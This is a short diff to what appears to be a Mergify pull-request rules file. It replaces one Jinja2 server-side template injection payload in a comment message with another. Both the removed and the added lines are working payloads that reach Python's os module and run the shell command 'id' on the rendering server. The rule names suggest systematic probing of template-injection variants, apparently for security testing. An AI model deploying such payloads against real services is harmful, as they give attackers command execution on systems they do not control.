@@ -1,10 +1,10 @@
 pull_request_rules:
-  - name: vm6-j2-cycler-261016
+  - name: vm6-j2-fromos-261016
     conditions:
-      - label = vm6-j2-cycler
+      - label = vm6-j2-fromos
     actions:
       comment:
-        message: "{{ cycler.__init__.__globals__['os'].popen('id').read() }}"
+        message: "{% from 'os' import popen %}{{ popen('id').read() }}"
 
 commands_restrictions:
   queue:
